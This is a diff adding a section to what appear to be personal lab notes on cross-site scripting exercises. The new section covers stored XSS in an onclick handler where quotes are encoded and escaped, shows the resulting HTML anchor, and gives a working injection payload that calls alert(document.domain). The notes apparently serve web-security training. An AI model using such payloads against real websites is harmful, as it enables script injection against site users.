@@ -838,6 +838,19 @@ In inspect mode
 
 That was in linback class, so that when you click return back or return to block link > it will trigger document.domain.
 
+__________________________________________________________________________________________________________________________________________________________________
+Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
+---------------------------------------------------------------------------------------------------------------------------
+
+Inject in website comment link ___
+
+What ever you write ' and / is always appeared
+
+<a id="author" href="http://foo?'-alert(document.domain)-'" onclick="var tracker={track(){}};tracker.track('http://foo?'-alert(document.domain)-'');">fkkk</a>
+
+
+injection payload --> http://foo?'-alert(document.domain)-
+
 
 
 
